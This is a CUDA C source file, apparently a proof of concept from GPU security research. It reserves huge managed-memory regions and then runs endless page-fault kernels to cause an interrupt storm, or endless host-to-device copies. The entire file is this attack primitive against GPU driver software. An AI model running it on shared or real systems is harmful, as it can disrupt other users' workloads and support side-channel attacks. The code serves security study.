#include <getopt.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

// Values taken from the TunneLs for Bootlegging paper
#define CHUNK0_SIZE (64L * 1024L * 1024L * 1024L * 1024L + 0x55554000000L)
#define CHUNK1_SIZE (41L * 1024L * 1024L * 1024L * 1024L + 0x0ffc8000000L)

#define PAGE_SIZE 0x1000
#define MAX_SIZE 0x100000

uint8_t *chunk0 = 0;
uint8_t *chunk1 = 0;

__global__ void put(uint64_t *page, uint64_t x1) {
    page[0] = x1;
    page[1] = x1;
    page[2] = x1;
}

void copy_data() {
    uint64_t *output;
    if (cudaMalloc(&output, MAX_SIZE) != cudaSuccess) {
        return;
    };
    uint64_t *data;
    if (cudaMallocHost(&data, MAX_SIZE, 0) != cudaSuccess) {
        cudaFree(output);
        return;
    }
    memset(data, 0x61, MAX_SIZE);
    printf("[!] start copying data\n");
    while (1) {
        cudaMemcpy(output, data, MAX_SIZE, cudaMemcpyHostToDevice);
    }
    cudaFreeHost(data);
    cudaFree(output);
}

__global__ void create_pagefault(uint8_t *p, uint64_t stride) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    uint8_t *page = (p + (idx * stride));
    *page = 0xff;
}

void interrupt_storm(uint8_t *page, uint32_t num_blocks, uint32_t num_threads, uint64_t stride) {
    volatile uint8_t *values = (uint8_t *)malloc(sizeof(uint8_t) * num_blocks * num_threads);
    uint32_t counter = 0;
    while (1) {
        create_pagefault<<<num_blocks, num_threads>>>(page, stride);
        cudaDeviceSynchronize();
        for (int i = 0; i < num_blocks * num_threads; i++) {
            values[i] = page[i * stride];
        }
        fprintf(stderr, "[%d] done\n", counter++);
        cudaDeviceSynchronize();
    }
    free((uint8_t *)values);
}


int main(int argc, char *argv[]) {

    cudaDeviceReset();
    // hoard a large address space, make sure that ASLR is disabled
    // chunk0 = 0x100000000000 --> 0x500000000000
    cudaMallocManaged(&chunk0, CHUNK0_SIZE);
    // chunk1 = 0x580000000000 --> 0x800000000000
    cudaMallocManaged(&chunk1, CHUNK1_SIZE);

    uint64_t stride = PAGE_SIZE;
    uint32_t num_threads = 32;
    uint32_t num_blocks = 1;
    uint64_t copy = 0;

    int c;
    while (1) {
        static struct option long_options[] = {
            {"num_threads",    required_argument, 0, 't'},
            {"num_blocks", required_argument, 0, 'b'},
            {"stride", required_argument, 0, 's'},
            {"copy", required_argument, 0, 'c'}
        };

        int option_index = 0;
        c = getopt_long(argc, argv, "t:b:s:", long_options, &option_index);

        if (c == -1)
            break;

        switch (c) {
            case 't':
                num_threads = atoi(optarg);
                break;
            case 'b':
                num_blocks = atoi(optarg);
                break;
            case 's':
                stride = strtoul(optarg, NULL, 16);
                break;
            case 'c':
                copy = atoi(optarg);
                break;
            case '?':
                exit(EXIT_FAILURE);
            default:
                abort();
        }
    }

    cudaDeviceSynchronize();

    printf("num_blocks: %d, num_threads: %d, stride: 0x%lx, copy: 0x%lx\n", num_blocks, num_threads, stride, copy);
    if (copy == 0) {
        interrupt_storm(chunk0, num_blocks, num_threads, stride);
    } else {
        copy_data();
    }

    cudaFree(chunk0);
    cudaFree(chunk1);

}


